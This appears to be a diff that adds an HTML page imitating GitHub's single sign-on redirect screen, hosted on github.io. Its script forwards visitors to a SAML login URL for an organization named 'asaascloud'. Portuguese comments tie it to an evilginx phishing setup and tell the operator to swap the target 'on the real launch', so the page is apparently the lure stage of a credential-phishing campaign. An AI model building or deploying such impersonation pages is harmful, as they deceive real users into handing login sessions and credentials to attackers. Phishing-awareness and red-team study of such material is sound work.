@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html
+  lang="en"
+  data-color-mode="dark" data-light-theme="light" data-dark-theme="dark"
+  data-a11y-animated-images="system" data-a11y-link-underlines="true"
+  >
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Initiating Single Sign-On</title>
+    <meta name="robots" content="noindex, nofollow">
+
+    <!--
+      Página intermediária NEUTRA (github.io) — mesmo visual da interstitial de
+      SSO, sem os injects/hunter do evilginx (que controlavam/prendiam a
+      navegação server-side). Redirect 100% client-side, determinístico.
+      TROCAR TARGET no disparo real se a etapa 2 migrar de domínio.
+    -->
+
+    <link rel="dns-prefetch" href="https://github.githubassets.com">
+    <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
+
+    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-afff6c53aef9b9d1.css" />
+    <link data-color-theme="light" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light-5c4e9fc574bf49f3.css" />
+    <link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-fb37c309e0603a69.css" />
+    <link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-0f910d8806d5761b.css" />
+    <link data-color-theme="light_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind_high_contrast-a7abd4d4c49ac593.css" />
+    <link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-5fc4c4a9cb41e596.css" />
+    <link data-color-theme="light_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia_high_contrast-ed0cee9214dedabd.css" />
+    <link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-c409873d7987dffa.css" />
+    <link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-78a2491d538dab5a.css" />
+    <link data-color-theme="dark_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind_high_contrast-c26b63d7c532d0a2.css" />
+    <link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-a6f60cea68c08405.css" />
+    <link data-color-theme="dark_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia_high_contrast-f66faf28b2ea18b6.css" />
+    <link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-6701f6218c53cf8b.css" />
+    <link data-color-theme="dark_dimmed_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed_high_contrast-7037fa46ae124d97.css" />
+    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-9be9fe6313f476af.css" />
+    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-62747e27e61258dc.css" />
+
+    <script>
+    (function(){
+      try {
+        var m = document.cookie.match(/(?:^|;\s*)color_mode=([^;]*)/);
+        var v = m ? decodeURIComponent(m[1]) : '';
+        var t = /"color_mode"\s*:\s*"(light|dark)"/.exec(v);
+        var dark = t ? (t[1] === 'dark') : window.matchMedia('(prefers-color-scheme: dark)').matches;
+        if (!dark) {
+          document.documentElement.setAttribute('data-color-mode', 'light');
+          var l = document.querySelector('link[data-color-theme="light"]');
+          var d = document.querySelector('link[href*="/dark-"]');
+          if (l && d) { d.setAttribute('href', l.getAttribute('data-href')); }
+        }
+      } catch (e) {}
+    })();
+    </script>
+
+    <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
+    <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
+    <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">
+
+    <meta name="theme-color" content="#1e2327">
+    <meta name="color-scheme" content="dark light" />
+
+    <meta http-equiv="refresh" content="1;url=https://asaascloud.cloudflareaccess.com/cdn-cgi/access/sso/saml/0ab180453f09a27ceeb86aadf22f203f49fe0ed322be33e30a941c1c2a156172">
+  </head>
+
+  <body style="word-wrap: break-word;">
+    <div class="container-md tmp-px-3">
+      <div data-view-component="true" class="tmp-mt-5 blankslate">
+        <svg aria-hidden="true" data-component="Octicon" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-shield-lock blankslate-icon">
+        <path d="M11.46 1.137a1.748 1.748 0 0 1 1.08 0l8.25 2.675A1.75 1.75 0 0 1 22 5.476V10.5c0 6.19-3.77 10.705-9.401 12.83a1.704 1.704 0 0 1-1.198 0C5.771 21.204 2 16.69 2 10.5V5.476c0-.76.49-1.43 1.21-1.664Zm.617 1.426a.253.253 0 0 0-.154 0L3.673 5.24a.25.25 0 0 0-.173.237V10.5c0 5.461 3.28 9.483 8.43 11.426a.199.199 0 0 0 .14 0c5.15-1.943 8.43-5.965 8.43-11.426V5.476a.25.25 0 0 0-.173-.237ZM13 12.232V15a1 1 0 0 1-2 0v-2.768a2 2 0 1 1 2 0Z"></path>
+        </svg>
+        <h3 data-view-component="true" class="mb-1 tmp-mb-1">You are being redirected to your identity provider in order to authenticate.</h3>
+
+        <p>
+          If your browser does not redirect you back, please <a id="redirect" class="Link--inTextBlock" href="https://asaascloud.cloudflareaccess.com/cdn-cgi/access/sso/saml/0ab180453f09a27ceeb86aadf22f203f49fe0ed322be33e30a941c1c2a156172">click here to continue</a>.
+        </p>
+      </div>
+    </div>
+
+    <script>
+    (function(){
+      var TARGET = 'https://asaascloud.cloudflareaccess.com/cdn-cgi/access/sso/saml/0ab180453f09a27ceeb86aadf22f203f49fe0ed322be33e30a941c1c2a156172';
+      function nav(){
+        try { window.location.replace(TARGET); }
+        catch (e) { window.location.href = TARGET; }
+      }
+      // primeira tentativa: 450ms (mesmo timing da interstitial original)
+      setTimeout(nav, 450);
+      // retries: se a navegação for cancelada/bloqueada e ainda estivermos
+      // nesta página, tenta de novo a cada 1.5s (até 10x)
+      var n = 0;
+      var iv = setInterval(function(){
+        n++;
+        if (n > 10 || window.location.hostname.indexOf('github.io') === -1) {
+          clearInterval(iv); return;
+        }
+        nav();
+      }, 1500);
+    })();
+    </script>
+  </body>
+</html>
